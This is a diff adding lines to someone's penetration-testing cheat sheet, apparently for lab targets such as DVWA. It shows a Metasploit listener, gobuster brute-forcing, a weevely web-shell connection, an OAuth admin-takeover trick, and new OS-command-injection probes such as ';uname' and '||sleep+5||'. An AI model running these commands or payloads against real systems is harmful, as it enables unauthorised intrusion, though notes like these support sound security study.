@@ -1,6 +1,9 @@
 use exploit/multi/handler
 [listen to port connection...set LHOST and LPORT]
 
+https://hackersonlineclub.com/command-injection-cheatsheet/
+[Command Injection Cheat]
+
 gobuster dir --url http://10.129.53.230 --wordlist directory-list-2.3-small.txt
 [directory bruteforce]
 
@@ -180,6 +183,14 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 - copy url containing OAuth code and replace the code with the new admin code
 - paste url in browser you should be logged in as admin
 
+#OS INJECTION
+[+] ";uname"/";pwd" right inline/front of a parameter or endpoint 
+[+] Check Submit Feedback and test email with ";sleep+5;"
+- or use "||sleep+5||"
+
+#XSS
+[-] Test site with html tags e.g <b>test<b> beforre inputting XSS
+[-] 
 
 
 *******************************
